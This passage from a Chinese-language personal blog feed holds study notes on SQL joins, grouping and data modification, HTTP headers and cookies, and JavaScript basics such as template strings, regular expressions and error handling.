内连接——INNER JOIN查询写法：1、先确定主表，仍然使用FROM &lt;表1&gt;的语法；                   2、再确定需要连接的表，使用INNER JOIN &lt;表2&gt;的语法；                   3、 然后确定连接条件，使用ON &lt;条件…&gt;，这里的条件是s.class_id = c.id，表示students表的class_id列                                                            与                       classes表的id列相同的行需要连接；                   4、可选：加上WHERE子句、ORDER BY等子句。
等值连接：
SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sINNER JOIN classes cON s.class_id = c.id;

INNER JOIN只返回同时存在于两张表的行数据，由于students表的class_id包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id &#x3D; c.id返回的结果集仅包含1，2，3。
非等值连接：条件不是一个等量关系
例子：员工工资在这个工资范围内
SELECTe.ename,e.sal,s.gradeFROMemp eINNER JOINsalgrade sONe.sal between s.losal and s.hisal;

自连接：一个表里面自己对应，技巧是一张表看成两张表
例子：找出员工及对应的领导
 SELECT     -&gt; a.ename yuangong,b.ename leader     -&gt; FROM     -&gt; emp a     -&gt; INNER JOIN     -&gt; emp b     -&gt; ON     -&gt; a.mgr=b.empno;（员工领导编号等于员工编号）
外连接–OUTER JOIN右外连接：RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段。
左外连接：LEFT OUTER JOIN则返回左表都存在的行。
FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL。
例子：SELECT s.id, s.name, s.class_id, c.name class_name, s.gender, s.scoreFROM students sRIGHT OUTER JOIN classes c（outer可以省略）ON s.class_id = c.id;

多个表进行连接select.....
from a 
join b 
on a和b的连接条件 
join c 
on a和c的连接条件 
join d
on a和d的连接条件 
一条SQL中内连接和外连接可以混合
DISTINCT作用：查询结果去除重复记录，但原表记录不会被修改
基础语法：SELECT DISTINCT 字段 FROM &lt;表名&gt;;
DINSTINCT只能出现在所有字段的最前方
例子：SELECT DISTINCT job,number FROM &lt;表名&gt;;表示job,number两个同时去重
分组查询select…from…where…group by…order by…执行顺序是from,where,group by,select,order by
分组语句：GROUP BY(例：SELECT COUNT(*) num FROM students GROUP BY class_id;)
​                   也可以使用多个列进行分组
​                  （SELECT class_id, gender, COUNT(*) num FROM students GROUP BY class_id, gender;）
（注意：在一条select语句当中，如果有grorup by语句的话，select后面只能跟参加分组的字段，以后分组函数，其他的一律不能跟。
例子：SELECT deptno,max(sal) from emp group by deptno;）
使用having可以对分完组之后的数据进一步过滤，其必须和group by一起用
例子：找出每个部门最高薪资并且要求显示最高薪资大于3000的数据
SELECT deptno,max(sal) FROM emp group by deptno having max(sal)&gt;3000;
WHERE实在没办法了再用having
(例子：找出每个部门的平均薪资，要求显示平均薪资高于2500的)
修改数据INSERT当我们需要向数据库表中插入一条新记录时，就必须使用INSERT语句。
语法：INSERT INTO &lt;表名&gt; (字段1, 字段2, …) VALUES (值1, 值2, …);
例子：我们向students表插入一条新记录，先列举出需要插入的字段名称，然后在VALUES子句中依次写出对应字段的值
​          INSERT INTO students (class_id, name, gender, score) VALUES (2, &#39;大牛&#39;, &#39;M&#39;, 80);
可以一次性添加多条记录，只需要在VALUES子句中指定多个记录值，每个记录是由**(…)**包含的一组值，中间用 ， 隔开
UPDATE语法：UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;
例子：UPDATE students SET name=&#39;大牛&#39;, score=66 WHERE id=1;（WHERE后面是需要更新的行的筛选条件）
UPDATE语句的WHERE条件和SELECT语句的WHERE条件其实是一样的，因此完全可以一次更新多条记录
在UPDATE语句中，更新字段时可以使用表达式
例子：UPDATE students SET score=score+10 WHERE score&lt;80;
注意如果WHERE条件没有匹配到任何记录，UPDATE语句不会报错，也不会有任何记录被更新
要特别小心的是，UPDATE语句可以没有WHERE条件，这个时候整个表的数据都会被更新！！！
DELETE基本语法：DELETE FROM &lt;表名&gt; WHERE ...;
DELETE语句也可以一次删除多条记录（例：DELETE FROM students WHERE id&gt;=5 AND id&lt;=7;）
与UPDATE语句类似WHERE条件没有匹配到任何记录，DELETE语句不会报错，也不会有任何记录被删除
和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据
在执行DELETE语句时也要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用DELETE删除。
数据处理函数又被称为单行处理函数，特点是一个输入对应一个输出
LOWER（转换成小写）语法：SELECT LOWER(字段) FROM &lt;表名&gt;;
UPPER转化成大写；语法：SELECT UPPER(字段) FROM &lt;表名&gt;;
SUBSTR取字符串;基本语法：SUBSTR(截取的字符串,起始下标,截取的长度)（注意：起始下标从1开始）
例子：SELECT SUBSTR(name,1,1) ename from students;
例子：SELECT  ename from emp where SUBSTR(ename,1,1)=&#39;A&#39;;(找出第一个字母是A的人)
LENGTH取长度；语法：SELECT LENGTH(字段) FROM &lt;表名&gt;;
例子：SELECT LENGTH(name) namelength FROM students;
TRIM去除前后空白
例子：SELECT * FROM emp WHERE ename=TRIM(&#39; King&#39;);（可以试试去除这个函数会发生什么）
ROUND四舍五入；例子：SELECT round(1234.567,0) result FROM emp;(0表示保留到整数位；-1表示保留到十位数)
RAND表示生成随机数：SELECT RAND() FROM emp;  例子： SELECT ROUND(RAND()*100,0) FROM emp;（100以内随机数）
IFNULL可以将NULL转换成一个具体值；基础语法：INFULL(数据,被当作哪个值);
所有数据库中有NULL参与的数学运算最后结果都为NULL，为避免这个现象需要使用IFNULL函数
例子：计算每个员工的年薪： SELECT ename,(sal+IFNULL(comm,0))*12 as yearsal from emp;
​            (试试去掉IFNULL函数会发生什么)
CASE..WHEN..THEN..WHEN..THEN..ELSE..END不会修改数据库
例子：当员工为MANAGER的时候工资上调10%，当员工为SALESMAN的时候工资上调50%
 SELECT     -&gt; ename,     -&gt; job,     -&gt; (case job when&#39;MANAGER&#39; then sal*1.1 when &#39;SALESMAN&#39; then sal*1.5 else sal end) newsal     -&gt; from emp;  
表格相关内容创建表格的通用语法：CREATE TABLE &lt;表名&gt;(
列名1 数据类型2，
列名2 数据类型2，
……
列名n 数据类型n
);
数据库类型：                    1. int：整数类型                           age int,                                        2. double:小数类型                           score double(5,2)                                                            3. date:日期，只包含年月日，yyyy-MM-dd                                                                                4. datetime:日期，包含年月日时分秒     yyyy-MM-dd HH:mm:ss                                                                                5. timestamp:时间错类型    包含年月日时分秒     yyyy-MM-dd HH:mm:ss                         如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值
                6. varchar：字符串
                       name varchar(20):姓名最大20个字符
                       zhangsan 8个字符  张三 2个字符

例子：create table student(           id int,           name varchar(32),           age int ,           score double(4,1),           birthday date,           insert_time timestamp           );
复制表：CREATE table 表名 like 被复制的表名；
查询某个数据库中所有的表名称： show tables;    查询表结构：desc 表名;
修改
修改表名         alter table 表名 rename to 新的表名;     2. 修改表的字符集         alter table 表名 character set 字符集名称;     3. 添加一列         alter table 表名 add 列名 数据类型;     4. 修改列名称 类型         alter table 表名 change 列名 新列别 新数据类型;         alter table 表名 modify 列名 新数据类型;     5. 删除列         alter table 表名 drop 列名;

删除语法：drop table 表名；
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>http协议，GET以及POST</title>
    <url>/2023/10/24/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/</url>
    <content><![CDATA[[TOC]
http协议http报文格式http协议的请求原文和响应报文的结构基本相同，由三个部分组成：
1.起始行：描述请求或响应的基本信息
2.头部字段集合(header)：使用key-value形式更详细地说明报文
3.消息正文(entity)：实际传输的数据，它不一定是纯文本，可以是图片，视频等二进制数据


header（报头）header 的整体格式是键值对结构，每个键值对占一行，键和值之间使用 冒号+空格 进行分割
以下是几种常见的报头：
HostHOST 的值表示服务器主机的地址和端口（地址可以是域名，也可以是 IP；端口号可以省略或者手动指定）
Content-LengthContent-Length 表示 body 的数据长度，长度单位是字节
Content-TypeContent-Type 表示 body 的数据格式，以下介绍三种请求中的数据格式

User-Agent（简称 UA）User-Agent 表示浏览器或者操作系统的属性
例子：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36
在这其中Windows NT 10.0; Win64; x64 表示操作系统信息；AppleWebKit/537.36 (KHTML, like Gecko)Chrome/91.0.4472.77 Safari/537.36 表示浏览器信息
RefererReferer 表示这个页面是从哪个页面跳转过来的，这是一个很有用的字段
假设我用 bing 浏览器搜索蛋糕，会发现有的搜索结果带有广告字眼，这就相当于广告主在 bing 浏览器用来引流的，当该网站的点击次数越多，用户的成交量也就会上升，金主给浏览器的广告费也就增多。为了统计该广告在某一浏览器的点击次数，就可以通过 Referer 字段来查看。
我们可以对该 HTTP 请求进行抓包，其中 Referer 字段的值就是 bing 浏览器，即表面该网页是从 bing 浏览器跳转过来的

（注意： 如果直接在浏览器中输入 URL 或直接通过收藏夹访问页面时，是没有 Referer 的）
Cookie
Cookie 是浏览器提供的一种让程序员在本地存储数据的能力
*为什么需要 Cookie？
如果没有 Cookie，直接将要存储的数据保存在客户端浏览器所在的主机的硬盘上，那么就会出现很大的安全风险，比如当你不小心打开某个不安全的网站，该网站就可以在你的硬盘上写一个病毒程序，那么你的电脑就挂了！因此浏览器为了保证安全性，就禁止网页中的代码访问主机的硬盘（无法在 JS 中读写文件），因此也就失去了持久化存储的能力，故 Cookie 就很重要！
*Cookie 里面存的是什么？
Cookie 中存储了一个字符串，是键值对结构的，键值对之间使用 ;分割，键和值之间使用 &#x3D; 分割
*Cookie 来自哪里，如何往 Cookie 中存储数据？
Cookie 这个数据可能是客户端（网页）自行通过 JS 写入的，也可能来自于服务器在 HTTP 响应的 header 中通过 Set-Cookie 字段给浏览器返回数据。
Cookie 在浏览器这边是按照域名维度来存储的，例如我们打开 CSDN 的首页，点击网址栏左边的一把小锁就能找到 Cookie，我们就可以看到打开这个网页时，系统按照不同域名设置了 Cookie

每一组都是中都存储了 Cookie，我们点开 csdn.net 这组的 Cookie 就能看到具体的数据

通过抓包工具，我们也能得到 Cookie 的数据，可以发现，上述中的键和值都是存在的，例如 uuid_tt_dd
*Cookie 要到哪里去？
Cookie 字段会在后续的请求中，把浏览器本地存储的这些键值对再发送回服务器

例子：保持客户端的登录状态

*Cookie 的缺陷：
每次请求都要把该域名下所有的 Cookie 通过 HTTP 请求传给服务器，因此 Cookie 的存储容量是有限的
xff
是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。
格式：X-Forwarded-For:IP
GETGET 是最常用的 HTTP 方法，常用于获取服务器上的某个资源。以下几种方式都会触发 GET 方法的请求
1.在浏览器中直接输入 URL 回车或点击浏览器收藏夹中的链接，此时浏览器就会发送出一个 GET 请求。2.HTML 中的 link、img、script 等标签的属性中放的 URL，浏览器也会构造出 HTTP GET 请求3.使用 Javascript 重点 ajax，也能构造出 HTTP GET 请求4.各种编程语言（只要能够访问网络），就都能够构造出 HTTP GER 请求
POSTPOST 方法也是一种常见的方法，多用于提交用户输入的数据给服务器（如登录页面）。以下几种方法都会触发 POST 方法的请求
1.通过 HTML 中的 form 标签可以构造 POST 请求2.使用 JavaScript 的 ajax 可以构造 POST 请求
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>JvaScript笔记</title>
    <url>/2024/01/20/JavaScript_max/JvaScript%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[文中代码若无特别说明那么都是写在内的
基础初识JavaScript 可以通过不同的方式来输出数据：

使用 window.alert() 弹出警告框来显示数据。
使用 document.write() 方法将内容写到 HTML 文档中。
使用 innerHTML 写入到 HTML 元素。
使用 console.log() 写入到浏览器的控制台。

如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。
请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：
&lt;script&gt;document.getElementById(&quot;demo&quot;).innerHTML = &quot;段落已修改。&quot;;&lt;/script&gt;

JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值 var length;
变量的数据类型可以使用 typeof 操作符来查看
可以在字符串中使用引号，只要不匹配包围字符串的引号即可
单行注释：//后面接内容
多行注释以 &#x2F;* 开始，以 ***&#x2F;** 结尾。
注释用于阻止其中一条代码行的执行（可用于调试）



break
用于跳出循环。



catch
语句块，在 try 语句块执行出错时执行 catch 语句块。


continue
跳过循环中的一个迭代。


do … while
执行一个语句块，在条件语句为 true 时继续执行该语句块。


for
在条件语句为 true 时，可以将代码块执行指定的次数。


for … in
用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）。


function
定义一个函数


if … else
用于基于不同的条件来执行不同的动作。


return
退出函数


switch
用于基于不同的条件来执行不同的动作。


throw
抛出（生成）错误 。


try
实现错误处理，与 catch 一同使用。


var
声明一个变量。


while
当条件语句为 true 时，执行语句块。


代码将修改自身元素的内容 (使用 this.innerHTML):
&lt;button onclick=&quot;this.innerHTML=Date()&quot;&gt;现在的时间是?&lt;/button&gt;

对象
对象属性有两种寻址方式
&lt;script&gt;var person=&#123;	firstname : &quot;John&quot;,	lastname  : &quot;Doe&quot;,	id        :  5566&#125;;document.write(person.lastname + &quot;&lt;br&gt;&quot;);document.write(person[&quot;lastname&quot;] + &quot;&lt;br&gt;&quot;);&lt;/script&gt;

Undefined 这个值表示变量不含有值。
可以通过将变量的值设置为 null 来清空变量
当您声明新变量时，可以使用关键词 “new” 来声明其类型 var carname=new String;
作用域在 JavaScript 中, 对象和函数同样也是变量。
在 JavaScript 中, 作用域为可访问变量，对象，函数的集合。
JavaScript 函数作用域: 作用域在函数内修改。
局部作用域
变量在函数内声明，变量为局部变量，具有局部作用域。
局部变量：只能在函数内部访问。
局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。
全局变量
变量在函数外定义，即为全局变量。
全局变量有 全局作用域: 网页中所有脚本和函数均可使用。 
如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。
// 此处可调用 carName 变量function myFunction() &#123;    carName = &quot;Volvo&quot;;    // 此处可调用 carName 变量&#125;

事件常见的HTML事件的列表：



事件
描述



onchange
HTML 元素改变


onclick
用户点击 HTML 元素


onmouseover
鼠标指针移动到指定的元素上时发生


onmouseout
用户从一个 HTML 元素上移开鼠标时发生


onkeydown
用户按下键盘按键


onload
浏览器已完成页面的加载


字符串可以使用内置属性 length 来计算字符串的长度
**match()**函数用来查找字符串中特定的字符，并且如果找到的话，则返回这个字符：document.write(str.match(&quot;world!&quot;));
replace() 方法在字符串中用某些字符替换另一些字符：var txt = str.replace(&quot;Microsoft&quot;,&quot;Runoob&quot;);
在 JavaScript 中，字符串写在单引号或双引号中。
因为这样，以下实例 JavaScript 无法解析：&quot;We are the so-called &quot;Vikings&quot; from the north.&quot;
字符串 “We are the so-called “ 被截断。
如何解决以上的问题呢？可以使用反斜杠 () 来转义 “Vikings” 字符串中的双引号，如下:
 &quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;
 反斜杠是一个转义字符。 转义字符将特殊字符转换为字符串字符



&#39;
单引号



&quot;
双引号


\
反斜杠


\n
换行


\r
回车


\t
tab(制表符)


\b
退格符


\f
换页符


模板字符串
JavaScript 中的模板字符串是一种方便的字符串语法，允许你在字符串中嵌入表达式和变量。
模板字符串使用反引号 &#96;&#96; 作为字符串的定界符分隔的字面量。
模板字面量是用反引号（**&#96;**）分隔的字面量，允许多行字符串、带嵌入表达式的字符串插值和一种叫带标签的模板的特殊结构。
语法
`string text``string text line 1 string text line 2``string text $&#123;expression&#125; string text`tagFunction`string text $&#123;expression&#125; string text`

参数

string text：将成为模板字面量的一部分的字符串文本。几乎允许所有字符，包括换行符和其他空白字符。但是，除非使用了标签函数，否则无效的转义序列将导致语法错误。
expression：要插入当前位置的表达式，其值被转换为字符串或传递给 tagFunction。
tagFunction：如果指定，将使用模板字符串数组和替换表达式调用它，返回值将成为模板字面量的值。

&lt;script&gt;  let text=`Nice!`;  document.getElementById(&quot;demo&quot;).innerHTML=text;&lt;/script&gt;

（注意：变量名前面最好是 let或者 const）
模板字符串支持同时使用单引号和双引号；支持多行文本而无需转义字符
若要转义模板字面量中的反引号（**&#96;），需在反引号之前加一个反斜杠（**）。
`\`` === &quot;`&quot;; // true

模板字面量用反引号（**&#96;）括起来，而不是双引号（“）或单引号（‘**）。
除了普通字符串外，模板字面量还可以包含占位符——一种由美元符号和大括号分隔的嵌入式表达式：**${expression}**。
字符串和占位符被传递给一个函数（要么是默认函数，要么是自定义函数）。默认函数（当未提供自定义函数时）只执行字符串插值来替换占位符，然后将这些部分拼接到一个字符串中。
模板字符串中允许我们使用变量
&lt;script&gt;const name = &#x27;Runoob&#x27;;const age = 30;const message = `My name is $&#123;name&#125; and I&#x27;m $&#123;age&#125; years old.`;document.getElementById(&quot;demo&quot;).innerHTML = message;&lt;/script&gt;

模板字符串中允许我们使用表达式
let price = 10;let VAT = 0.25;let total = `Total: $&#123;(price * (1 + VAT)).toFixed(2)&#125;`;

模板字符串当作 HTML 模板使用
let header = &quot;&quot;;let tags = [&quot;RUNOOB&quot;, &quot;GOOGLE&quot;, &quot;TAOBAO&quot;];let html = `&lt;h2&gt;$&#123;header&#125;&lt;/h2&gt;&lt;ul&gt;`;for (const x of tags) &#123;  html += `&lt;li&gt;$&#123;x&#125;&lt;/li&gt;`;&#125;html += `&lt;/ul&gt;`;

Date()对象创建日期
参数大多数都是可选的，在不指定的情况下，默认参数是0。
new Date();  var today = new Date()new Date(value); var d1 = new Date(&quot;October 13, 1975 11:13:00&quot;)new Date(dateString); var d2 = new Date(79,5,24)new Date(year, monthIndex [, day [, hours [, minutes [, seconds [, milliseconds]]]]]);var d3 = new Date(79,5,24,11,33,0)

设置日期
下面例子是设定一个特定的日期
var myDate=new Date();myDate.setFullYear(2010,0,14);// 第二个参数为月份， 0 到 11 之间的整数值，表示从一月到十二月

这个例子是设成五天后的日期
var myDate=new Date();myDate.setDate(myDate.getDate()+5);

如果增加天数会改变月份或者年份，那么日期对象会自动完成这种转换。
For&#x2F;In循环遍历对象的属性：
&lt;script&gt;function myFunction()&#123;	var x;	var txt=&quot;&quot;;	var person=&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;; 	for (x in person)&#123;		txt=txt + person[x];	&#125;	document.getElementById(&quot;demo&quot;).innerHTML=txt;&#125;&lt;/script&gt;

JavaScript 标签与 break 和 continue 一起使用的理解如需标记 JavaScript 语句，请在语句之前加上冒号：lable:
break 和 continue 语句仅仅是能够跳出代码块的语句。语法如下：
break labelname;continue labelname;

break 的作用是跳出代码块, 所以 break 可以使用于循环和 switch 等
continue 的作用是进入下一个迭代, 所以 continue 只能用于循环的代码块。
代码块: 基本上是｛｝大括号之间
然后：

默认标签的情况（除了默认标签情况，其他时候必须要有名标签，否则会有惊喜）

当 break 和 continue 同时用于循环时，没有加标签，此时默认标签为当前”循环”的代码块。
当 break 用于 switch 时，默认标签为当前的 switch 代码块:
有名标签的情况
cars=[&quot;BMW&quot;,&quot;Volvo&quot;,&quot;Saab&quot;,&quot;Ford&quot;];list:&#123;    document.write(cars[0] + &quot;&quot;);    document.write(cars[1] + &quot;&quot;);    document.write(cars[2] + &quot;&quot;);    break list;    document.write(cars[3] + &quot;&quot;);    document.write(cars[4] + &quot;&quot;);    document.write(cars[5] + &quot;&quot;);&#125;

上述break list;会跳出list的代码块。如果将break换成continue会有惊喜（会报错），违反了明确中的第二点，因为list只是个普通代码块，而不是循环。除非list写成如下形式 list:
for(var i=0; i&lt;10; ++i)&#123;    continue list;&#125;

有了标签，可以使用break和continue在多层循环的时候控制外层循环。
例如下面：
outerloop:for (var i = 0; i &lt; 10; i++)&#123;    innerloop:    for (var j = 0; j &lt; 10; j++)    &#123;        if (j &gt; 3)        &#123;            break;        &#125;        if (i == 2)        &#123;            break innerloop;        &#125;        if (i == 4)        &#123;            break outerloop;        &#125;        document.write(&quot;i=&quot; + i + &quot; j=&quot; + j + &quot;&quot;);    &#125;&#125;

undefined与null null 表示 “什么都没有”，是一个只有一个值的特殊类型。表示一个空对象引用。
 undefined 是一个没有设置值的变量。typeof 一个没有值的变量会返回 undefined
typeof undefined    // undefinedtypeof null         // objectnull === undefined  // falsenull == undefined   // true

两者值相等但是类型不相等
类型转换Number() 转换为数字， String() 转换为字符串， Boolean() 转换为布尔值
6 种不同的数据类型：string，number，boolean，object，function，symbol
3 种对象类型：Object，Date，Array
2 个不包含任何值的数据类型：null，undefined
注意：使用typrof操作符不能判断是Array还是Date，因为它两返回的数据类型都是object
constructor属性
返回所有 JavaScript 变量的构造函数
&quot;John&quot;.constructor                 // 返回函数 String()  &#123; [native code] &#125;(3.14).constructor                 // 返回函数 Number()  &#123; [native code] &#125;false.constructor                  // 返回函数 Boolean() &#123; [native code] &#125;[1,2,3,4].constructor              // 返回函数 Array()   &#123; [native code] &#125;&#123;name:&#x27;John&#x27;, age:34&#125;.constructor  // 返回函数 Object()  &#123; [native code] &#125;new Date().constructor             // 返回函数 Date()    &#123; [native code] &#125;function () &#123;&#125;.constructor         // 返回函数 Function()&#123; [native code] &#125;

查看对象是否为数组的方法
第一种：使用constructor属性来判断
var fruits=[&quot;banana&quot;,&quot;orange&quot;,&#x27;apple&#x27;];document.getElementById(&quot;demo&quot;).innerHTML=checkArray(fruits);function checkArray(Array)&#123;  return Array.constructor.toString().indexOf(&quot;Array&quot;)&gt;-1;&#125;

return myArray.constructor.toString().indexOf(&quot;Array&quot;) &gt; -1;：这行代码使用 constructor 属性获取传入数组的构造函数，将其转换为字符串，并检查字符串中是否包含 “Array”。如果包含，返回 true 表示是数组，否则返回 false 表示不是数组。
第二种：使用内置函数来判断（gpt告诉我的，更为简便）
Array.isArray() 方法，它是 JavaScript 的内建方法，专门用于检查一个对象是否是数组
document.getElementById(&quot;demo&quot;).innerHTML = Array.isArray(fruits);

查看对象是否为日期的方法
第一种同上
第二种使用 instanceof 关键字可以确定一个对象是否属于特定的构造函数
var myDate = new Date();if (myDate instanceof Date) &#123;    console.log(&#x27;myDate 是一个 Date 对象&#x27;);&#125; else &#123;    console.log(&#x27;myDate 不是一个 Date 对象&#x27;);&#125;

其中的 console.log被用于输出字符串到控制台，具体取决于 myDate 对象是否是 Date 类型。如果是 Date 类型，将输出 &#39;myDate 是一个 Date 对象&#39;，否则将输出 &#39;myDate 不是一个 Date 对象&#39;。（摁F12或者直接查看开发者工具）
日期转化为字符串（还有数字，布尔值转化成字符串的方法网上都可以找到，这里就不一一列举了）



getDate()
从 Date 对象返回一个月中的某一天 (1 ~ 31)。



getDay()
从 Date 对象返回一周中的某一天 (0 ~ 6)。


getFullYear()
从 Date 对象以四位数字返回年份。


getHours()
返回 Date 对象的小时 (0 ~ 23)。


getMilliseconds()
返回 Date 对象的毫秒(0 ~ 999)。


getMinutes()
返回 Date 对象的分钟 (0 ~ 59)。


getMonth()
从 Date 对象返回月份 (0 ~ 11)。


getSeconds()
返回 Date 对象的秒数 (0 ~ 59)。


getTime()
返回 1970 年 1 月 1 日至今的毫秒数。


字符串转为数字的方法：
Number()



方法
描述



parseFloat()
解析一个字符串，并返回一个浮点数。


parseInt()
解析一个字符串，并返回一个整数。


正则表达式正则表达式是由一个字符序列形成的搜索模式，当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。
正则表达式可以是一个简单的字符，或一个更复杂的模式，可用于所有文本搜索和文本替换的操作。
语法：/正则表达式主体/修饰符(可选)

正则表达式通常用于两个字符串方法 : search() 和 replace()。
search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。
function myFunction()&#123;  var str=&quot;Visit runoob&quot;;  var n=str.search(/Runoob/i);  document.getElementById(&quot;demo&quot;).innerHTML=n;&#125;

replace() 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。
function myFunction()&#123;  var str=document.getElementById(&quot;demo&quot;).innerHTML;  var txt=str.replace(/die/i,&quot;happy&quot;);  document.getElementById(&quot;demo&quot;).innerHTML=txt;&#125;

修饰符



i
执行对大小写不敏感的匹配。



g
执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。


m
执行多行匹配。


正则表达式模式
方括号用于查找某个范围内的字符：



表达式
描述



[abc]
查找方括号之间的任何字符。


[0-9]
查找任何从 0 至 9 的数字。


(x|y)
查找任何以 | 分隔的选项。


元字符是拥有特殊含义的字符：



元字符
描述



\d
查找数字。


\s
查找空白字符。


\b
匹配单词边界。


\uxxxx
查找以十六进制数 xxxx 规定的 Unicode 字符。


量词:



量词
描述



n+
匹配任何包含至少一个 n 的字符串。


n*
匹配任何包含零个或多个 n 的字符串。


n?
匹配任何包含零个或一个 n 的字符串。


RegExp对象RegExp 对象是一个预定义了属性和方法的正则表达式对象
创建 RegExp 对象的方式

字面量表示法：使用斜杠（/）将正则表达式括起来。
javascriptCopy codevar regex = /pattern/;

构造函数表示法：使用 RegExp 构造函数创建一个 RegExp 对象。
javascriptCopy codevar regex = new RegExp(&quot;pattern&quot;);

RegExp对象的常用方法和属性

**test()**：用于检测字符串是否匹配正则表达式。如果匹配成功，则返回 true，否则返回 false。
var pattl=new RegExp(&quot;e&quot;);document.write(pattl.test(&quot;The best thing&quot;));

**exec()**：用于在字符串中执行一个搜索匹配。如果匹配成功，则返回一个结果数组；否则返回 null。
var regex = /\d+/g; // 定义一个正则表达式，用于匹配数字var str = &quot;Today is 2024-01-11, and it&#x27;s raining. The temperature is 15°C.&quot;;var match;while ((match = regex.exec(str)) !== null) &#123;  console.log(&quot;Found: &quot; + match[0] + &quot;, at index: &quot; + match.index);&#125;

source：RegExp 对象的只读属性，返回正则表达式的文本字符串。
javascriptCopy codeconsole.log(regex.source);

flags：RegExp 对象的只读属性，返回正则表达式的修饰符字符串。


console.log(regex.flags);

throw,try,catchtry 语句测试代码块的错误。
catch 语句处理错误。
throw 语句创建自定义错误。
finally 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行。
抛出(throw)错误
当错误发生时，当事情出问题时，JavaScript 引擎通常会停止，并生成一个错误消息。
描述这种情况的技术术语是：JavaScript 将抛出一个错误。
try和catch
try 语句允许我们定义在执行时进行错误测试的代码块。
catch 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。
JavaScript 语句 try 和 catch 是成对出现的。
try &#123;    ...    //异常的抛出&#125; catch(e) &#123;    ...    //异常的捕获与处理&#125; finally &#123;    ...    //结束处理&#125;

实例如下：
&lt;script&gt;  var txt=&quot;&quot;;  function message()&#123;    try &#123;      adddlert(&quot;Welcome guest!&quot;);    &#125;    catch(err) &#123;      txt=&quot;本页有一个错误。\n\n&quot;;      txt+=&quot;错误描述：&quot; + err.message + &quot;\n\n&quot;;      txt+=&quot;点击确定继续。\n\n&quot;;      alert(txt);    &#125;  &#125;&lt;/script&gt;&lt;input type=&quot;button&quot; value=&quot;点击查看消息&quot; onclick=&quot;message()&quot;/&gt;

对于err.message的理解：catch 块捕获了可能发生的错误，并将错误对象存储在变量 err 中。然后，通过 err.message 属性可以获取到该错误对象的消息内容，即错误的描述信息。
与finally语句之间的联用
&lt;p&gt;不管输入是否正确，输入框都会再输入后清空。&lt;/p&gt;&lt;p&gt;请输入 5 ~ 10 之间的数字：&lt;/p&gt;&lt;input id=&quot;demo&quot; type=&quot;text&quot;&gt;&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点我&lt;/button&gt;&lt;p id=&quot;p01&quot;&gt;&lt;/p&gt;&lt;script&gt;function myFunction() &#123;  var message, x;  message = document.getElementById(&quot;p01&quot;);  message.innerHTML = &quot;&quot;;  x = document.getElementById(&quot;demo&quot;).value;  try &#123;     if(x == &quot;&quot;) throw &quot;值是空的&quot;;    if(isNaN(x)) throw &quot;值不是一个数字&quot;;    x = Number(x);    if(x &gt; 10) throw &quot;太大&quot;;    if(x &lt; 5) throw &quot;太小&quot;;  &#125;  catch(err) &#123;    message.innerHTML = &quot;错误: &quot; + err + &quot;.&quot;;  &#125;  finally &#123;    document.getElementById(&quot;demo&quot;).value = &quot;&quot;;  &#125;&#125;&lt;/script&gt;

isNaN() 是 JavaScript 中的一个内置函数，用于检查一个值是否为 “NaN”（Not-a-Number，非数字）。
表单验证HTML约束验证
HTML 约束验证基于：HTML 输入属性，CSS 伪类选择器，DOM 属性和方法
HTML 输入属性：



属性
描述



disabled
规定输入的元素不可用


max
规定输入元素的最大值


min
规定输入元素的最小值


pattern
规定输入元素值的模式


required
规定输入元素字段是必需的


type
规定输入元素的类型


必填或必选项目
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;head&gt;&lt;script&gt;function validateForm()&#123;var x=document.forms[&quot;myForm&quot;][&quot;fname&quot;].value;if (x==null || x==&quot;&quot;)&#123;  alert(&quot;姓必须填写&quot;);  return false;  &#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form name=&quot;myForm&quot; action=&quot;demo-form.php&quot; onsubmit=&quot;return validateForm()&quot; method=&quot;post&quot;&gt;姓: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

